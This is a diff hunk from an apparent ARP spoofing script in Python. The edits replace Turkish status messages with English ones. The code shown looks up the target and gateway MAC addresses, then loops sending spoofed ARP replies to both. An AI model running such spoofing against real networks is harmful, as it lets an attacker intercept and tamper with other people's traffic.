@@ -30,18 +30,18 @@ def main():
             trg_mac = G_MAC(trg_ip)
             print ("[+]Target MAC ", trg_mac)
         except:
-            print ("[-]Target is not respond(Birader bisey Ters gidiyor....)")
+            print ("[-]Target is not respond")
             quit()
     
         try:
             g_mac = G_MAC(g_ip)
             print ("[+]Gateway MAC ", g_mac)
         except:
-            print ("[-] May be an error in the gateway (Birader bi gatewayy kontrol yap...)")
+            print ("[-] May be an error in the gateway")
             quit()
 
         try:
-            print ("[[+]HADI BASLAYALIM! ]")
+            print ("[[+]OK ! ]")
             while True:
                 arp_spoof(trg_ip, trg_mac, g_ip)#target mackinayı spoof
                 arp_spoof(g_ip, g_mac, trg_ip)#target gateway spoof
